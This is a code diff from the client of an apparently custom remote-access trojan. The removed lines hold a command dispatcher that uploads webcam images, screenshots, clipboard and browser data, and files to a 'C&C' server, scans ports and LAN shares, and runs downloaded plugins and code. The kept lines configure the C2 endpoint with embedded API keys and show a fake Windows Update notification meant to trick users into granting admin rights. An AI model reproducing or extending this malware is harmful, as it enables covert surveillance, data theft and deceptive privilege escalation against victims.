@@ -1,20 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Drawing;
-using System.Text;
 using System.Windows.Forms;
 using System.IO;
-using KeyLogTest.Delegates;
-using System.Net;
 using Library;
-using System.Diagnostics;
 using Client.Properties;
 using System.Security.Principal;
-using Models;
-using Ionic.Zip;
-using Ionic.Zlib;
-using System.Reflection;
+using ClientHandler;
 using PluginManager;
 
 namespace Client
@@ -25,27 +15,69 @@ namespace Client
         {
             get { return false; }
         }
-        NotifyIcon notifyIcon;
-        private PluginManager.PluginManager pluginManager;
 
         public Form1(string[] args)
         {
             InitializeComponent();
+            Setup();
+        }
+
+        private void Setup()
+        {
             AppendText("Initializing...");
-            Handler.Instance.OnAuthorizedEvent += Instance_OnAuthorizedEvent;
+            AppendText("Authorizing...");
+            Handler.Instance.OnAuthorizedEvent += (o, e) =>
+            {
+                if (e.IsAuthenticated)
+                {
+                    AppendText("Successfully authorized");
+                    AppendText("Waiting for a command...");
+                }
+                else
+                {
+                    AppendText("Authorization failed");
+                }
+            };
             Handler.Instance.Initialize(new HandlerInitData()
             {
                 HostForm = this,
-                //Url = new Uri("http://localhost:64737/api"),
-                Url = new Uri("http://restlesshoneyseeker.azurewebsites.net/api"),
+                Url = new Uri("http://localhost:64737/api"),
+                //Url = new Uri("http://restlesshoneyseeker.azurewebsites.net/api"),
                 APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1",
                 APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef",
                 CONNECTION_TIMEOUT = 10000,
                 CONNECTION_INTERVAL = 10000,
-                startNewProcessOnExit = false,
+                StartNewProcessOnExit = false,
                 HideOnStart = false
             });
-            Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
+            Handler.Instance.OnCommandEvent += (o, e) =>
+            {
+                var settings = Handler.Instance.Transmitter.TSettings;
+                var command = e.Command;
+                if (command != ECommand.DO_NOTHING)
+                {
+                    if (Handler.Instance.TransmitterStatus == TransmitterStatus.IDLE)
+                    {
+                        AppendText("Received command: " + command + ", File: " + settings.File + ", Parameters: " + settings.Parameters);// + ", Status: " + settings.Status);
+                        Handler.Instance.ExecuteCommand(command);
+                    }
+                    if (Handler.Instance.TransmitterStatus == TransmitterStatus.BUSY)
+                    {
+                        AppendText("Working... Command: " + command);
+                        if (Handler.Instance.Worker.IsDone)
+                        {
+                            AppendText("Uploading results...");
+                            Handler.Instance.StopWork();
+                            AppendText("Done!");
+                            AppendText("Waiting for a command...");
+                        }
+                        else
+                        {
+                            //ExecuteCommand(command);
+                        }
+                    }
+                }
+            };
             //LoadPlugins();
             //SetupFakeMsg();
             //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
@@ -55,212 +87,6 @@ namespace Client
         {
             richTextBox1.AppendText(string.Format("{0:G}", DateTime.Now) + " : " + text + Environment.NewLine);
         }
-
-        void Instance_OnAuthorizedEvent(object sender, AuthEventArgs e)
-        {
-            if (e.IsAuthenticated)
-            {
-                AppendText("Authorized");
-            }
-        }
-
-        void Instance_OnCommandEvent(object sender, CommandEventArgs e)
-        {
-            var settings = Handler.Instance.Transmitter.TSettings;
-            var command = e.Command;
-            if (command != ECommand.DO_NOTHING)
-            {
-                if (Handler.Instance.TransmitterStatus == TransmitterStatus.IDLE)
-                {
-                    AppendText("Received command: " + command + ", File: " + settings.File + ", Parameters: " + settings.Parameters);// + ", Status: " + settings.Status);
-                    ExecuteCommand(command);
-                }
-                if (Handler.Instance.TransmitterStatus == TransmitterStatus.BUSY)
-                {
-                    AppendText("Working... Command: " + command);
-                    if (Handler.Instance.Worker.IsDone)
-                    {
-                        AppendText("Uploading results...");
-                        Handler.Instance.StopWork();
-                        AppendText("Done!");
-                    }
-                    else
-                    {
-                        //ExecuteCommand(command);
-                    }
-                }
-            }
-        }
-
-        void ExecuteCommand(ECommand command)
-        {
-            switch (command)
-            {
-                case ECommand.SYSCMD_SHUTDOWN:
-                    Handler.Instance.Shutdown();
-                    break;
-                case ECommand.SYSCMD_RESTART:
-                    Handler.Instance.Restart();
-                    break;
-                case ECommand.SYSCMD_LOGOFF:
-                    Handler.Instance.Logoff();
-                    break;
-                case ECommand.SYSCMD_LOCKCOMPUTER:
-                    Handler.Instance.LockComputer();
-                    break;
-                case ECommand.SYSCMD_HIBERNATE:
-                    Handler.Instance.LockComputer();
-                    break;
-                case ECommand.SYSCMD_SLEEP:
-                    Handler.Instance.LockComputer();
-                    break;
-                case ECommand.UPLOAD_PORTSCAN:
-                    Handler.Instance.UploadPortscan();
-                    break;
-                case ECommand.UPLOAD_GATEWAYS:
-                    Handler.Instance.UploadGatewayInfo();
-                    break;
-                case ECommand.UPLOAD_LAN_COMPUTERS:
-                    Handler.Instance.UploadLANComputers();
-                    break;
-                case ECommand.UPLOAD_SHARES:
-                    Handler.Instance.UploadShares();
-                    break;
-                case ECommand.SET_TRANSMISSION_INTERVAL:
-                    Handler.Instance.SetTransmissionInterval();
-                    break;
-                case ECommand.UPLOAD_IMAGE:
-                    Handler.Instance.UploadDesktopImage();
-                    break;
-                case ECommand.EXECUTE_COMMAND:
-                    Handler.Instance.ExecuteCommand();
-                    break;
-                case ECommand.UPLOAD_CLIPBOARD_DATA:
-                    Handler.Instance.UploadClipboardData();
-                    break;
-                case ECommand.UPLOAD_WEBCAM_IMAGE:
-                    Handler.Instance.UploadWebcamImage();
-                    break;
-                case ECommand.UPLOAD_PORT_INFO:
-                    Handler.Instance.UploadPortInfo();
-                    break;
-                case ECommand.UPLOAD_PROCESS_INFO:
-                    Handler.Instance.UploadProcessInfo();
-                    break;
-                case ECommand.UPLOAD_BROWSER_DATA:
-                    Handler.Instance.UploadBrowserData();
-                    break;
-                case ECommand.UPLOAD_FILE_EVENTS:
-                    Handler.Instance.UploadFileEvents();
-                    break;
-                case ECommand.DOWNLOAD_FILE:
-                    // File retreived from C&C server
-                    Handler.Instance.DownloadFile();
-                    break;
-                case ECommand.UPLOAD_FILE:
-                    // File transmitted to C&C server
-                    Handler.Instance.UploadFile();
-                    break;
-                case ECommand.STREAM_DESKTOP:
-                    Handler.Instance.StreamDesktop();
-                    break;
-                case ECommand.STOP_STREAM_DESKTOP:
-                    Handler.Instance.StopStreamDesktop();
-                    break;
-                case ECommand.MOVE_CURSOR:
-                    Handler.Instance.CursorInteract();
-                    break;
-                case ECommand.KILL_PROCESS:
-                    Handler.Instance.KillProcess();
-                    break;
-                case ECommand.EXECUTE_PLUGIN:
-                    ExecutePlugin();
-                    break;
-                case ECommand.KILL_PLUGIN:
-                    KillPlugin();
-                    break;
-                case ECommand.UPLOAD_PLUGIN:
-                    UploadPlugin();
-                    break;
-                case ECommand.EXECUTE_CODE:
-                    Handler.Instance.ExecuteCode();
-                    break;
-            }
-        }
-
-        private void UploadPlugin()
-        {
-            byte[] data = Handler.Instance.Transmitter.DownloadFile();
-            if (data != null)
-            {
-                var path = Handler.Instance.DirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
-                //File.WriteAllBytes(path, data);
-                try
-                {
-                    Compression.Extract(data, path);
-                }
-                catch (Exception)
-                {
-                    // probably not a zip file
-                }
-            }
-            LoadPlugins();
-        }
-
-        private void KillPlugin()
-        {
-            if (pluginManager != null)
-            {
-                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
-                if (plugin != null)
-                {
-                    pluginManager.RemovePlugin(plugin);
-                }
-            }
-        }
-
-        private void ExecutePlugin()
-        {
-            if (pluginManager != null)
-            {
-                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
-                if (plugin != null)
-                {
-                    object data = null;
-                    try
-                    {
-                        data = plugin.Client.Execute(Handler.Instance.Transmitter.TSettings.Parameters);
-                    }
-                    catch (Exception ex)
-                    {
-                        data = ex.ToString();
-                    }
-                    if (data != null)
-                    {
-                        File.WriteAllBytes(Path.Combine(Handler.Instance.AppDir, "data.dat"), Encoding.Default.GetBytes(Convert.ToString(data)));
-                        Handler.Instance.Transmitter.UploadData("data.dat", data, false);
-                    }
-                }
-            }
-        }
-
-        void LoadPlugins()
-        {
-            pluginManager = new PluginManager.PluginManager(this, Handler.Instance.DirPlugins);
-            //Initialize the plugins
-            foreach (var p in pluginManager.Plugins)
-            {
-                try
-                {
-                    p.Client.Initialize();
-                }
-                catch (Exception)
-                {
-                    // write better code ;) or throw in the trash (pun intended)
-                }
-            }
-        }
-
 
         private void SetupFakeMsg()
         {
@@ -278,41 +104,32 @@ namespace Client
             timer.Elapsed += (o, e) =>
             {
                 timer.Enabled = false;
-                notifyIcon = new NotifyIcon();
+                var notifyIcon = new NotifyIcon();
                 notifyIcon.Icon = Resources.windows_update_icon_2;
                 notifyIcon.BalloonTipIcon = ToolTipIcon.Warning;
                 notifyIcon.BalloonTipTitle = title;
                 notifyIcon.BalloonTipText = text;
                 notifyIcon.Visible = true;
-                notifyIcon.Click += notifyIcon_Click;
-                notifyIcon.BalloonTipClicked += notifyIcon_BalloonTipClicked;
+                notifyIcon.Click += (nio, nie) =>
+                {
+                    notifyIcon.ShowBalloonTip(5000);
+                };
+                notifyIcon.BalloonTipClicked += (btco, btce) =>
+                {
+                    var pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
+                    var hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
+                    if (!hasAdministrativeRight)
+                    {
+                        if (Handler.Instance.RunElevated(Application.ExecutablePath))
+                        {
+                            this.Close();
+                            Application.Exit();
+                        }
+                    }
+                };
                 notifyIcon.ShowBalloonTip(5000);
             };
             timer.Enabled = true;
-        }
-
-        void notifyIcon_Click(object sender, EventArgs e)
-        {
-            notifyIcon.ShowBalloonTip(5000);
-        }
-
-        void notifyIcon_BalloonTipClicked(object sender, EventArgs e)
-        {
-            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
-            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
-            if (!hasAdministrativeRight)
-            {
-                if (Handler.Instance.RunElevated(Application.ExecutablePath))
-                {
-                    this.Close();
-                    Application.Exit();
-                }
-            }
-        }
-
-        private void Form1_Load(object sender, EventArgs e)
-        {
-
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
